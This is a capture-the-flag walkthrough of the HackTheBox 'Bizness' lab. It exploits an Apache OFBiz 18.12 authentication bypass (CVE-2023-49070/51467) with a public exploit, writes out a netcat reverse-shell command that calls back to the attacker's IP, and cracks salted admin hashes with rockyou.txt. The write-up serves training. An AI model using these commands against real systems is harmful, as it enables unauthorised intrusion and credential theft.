To start this lab we begin by enumerating the open ports on the server with nmap. Using “nmap 10.129.192.232” reveals that ports 22, 80, and 443 are open. Let’s add “10.129.192.232 bizness.htb” to /etc/hosts for our convenience and access the website. 

We’ll begin here by running wfuzz on the website and seeing what directories and subdomains can be found. We ended up using dirbuster here to find a decent list of all subdirectories. Of them, a few subdirectories have the keyword “admin”, but they don’t appear accessible right now. Let’s just focus on getting that user flag. We’ll begin with finding a login page, which is at “control/login”. The login page is an OFBiz application, and the bottom right tells us the version is 18.12. CVE-2023-49070 and CVE-2023-51467 appear to be what we’re looking for. An online repo by UserConnecting seems to have python code that can do this for us. Let’s get the repo using git clone. In one terminal, execute nc -lvp 1234, in the other, execute “python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.173 1234’”. This will send the nc command to the website and cause it to callback to your port 1234. From here simply navigate to /home/ofbiz to read the user.txt file. Next we need to do some privilege escalation, and we’ll start by looking for information. LinPEAS was difficult to set up in the exploitation target, so I just did a find for all files with the string “*admin*”. We find an xml file that seems to have the super user’s SHA1 hashed password. Trying to decipher it proved useless as we didn’t have the hash. However, searching for the phrase “$SHA$d” allowed us to find a few binary files. Performing ‘strings’ on those files gave us some salted hashes. We used the program OFBiz-crack.py, along with rockyou.txt to get the password. From here we simply log in, move to /root and read root.txt. 
